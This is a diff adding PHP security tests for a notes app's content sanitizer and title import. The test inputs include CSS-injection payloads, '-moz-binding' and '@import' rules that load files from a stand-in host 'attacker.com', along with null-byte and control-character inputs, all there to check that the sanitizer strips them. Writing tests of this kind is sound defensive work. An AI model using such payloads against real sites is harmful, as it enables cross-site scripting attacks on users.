@@ -442,3 +442,39 @@ test('security: login endpoint throttles brute force attempts after 10 requests'
 
     $response->assertStatus(429);
 });
+
+test('security: note content sanitizer removes null bytes and neutralizes css binding and import exfiltrations', function () {
+    $sanitizer = app(NoteContentSanitizer::class);
+
+    $dirtyWithNullByte = "Hello \0 World<p>Safe \0 Text</p>";
+    $sanitized = $sanitizer->sanitize($dirtyWithNullByte);
+    expect($sanitized)->not->toContain("\0")
+        ->and($sanitized)->toContain('Hello  World')
+        ->and($sanitized)->toContain('Safe  Text');
+
+    $dirtyStyleBinding = '<div style="color: blue; -moz-binding: url(http://attacker.com/xss.xml#test);">Malicious</div>';
+    $cleanBinding = $sanitizer->sanitize($dirtyStyleBinding);
+    expect($cleanBinding)->not->toContain('-moz-binding');
+
+    $dirtyStyleImport = '<div style="color: red; @import url(http://attacker.com/xss.css);">Import Attack</div>';
+    $cleanImport = $sanitizer->sanitize($dirtyStyleImport);
+    expect($cleanImport)->not->toContain('@import');
+});
+
+test('security: note import sanitizes control characters from manuscript titles', function () {
+    $user = User::factory()->create();
+
+    $payload = [
+        'title' => "Forbidden\x00Title\x1FWith\x08ControlChars",
+        'content' => "## Clean Header\n\nSome body text here.",
+    ];
+
+    $response = $this->actingAs($user)->postJson('/api/notes/import', $payload);
+    $response->assertStatus(201);
+
+    $createdNote = Note::where('user_id', $user->id)->first();
+    expect($createdNote->title)->toBe('ForbiddenTitleWithControlChars')
+        ->and($createdNote->title)->not->toContain("\x00")
+        ->and($createdNote->title)->not->toContain("\x1F")
+        ->and($createdNote->title)->not->toContain("\x08");
+});
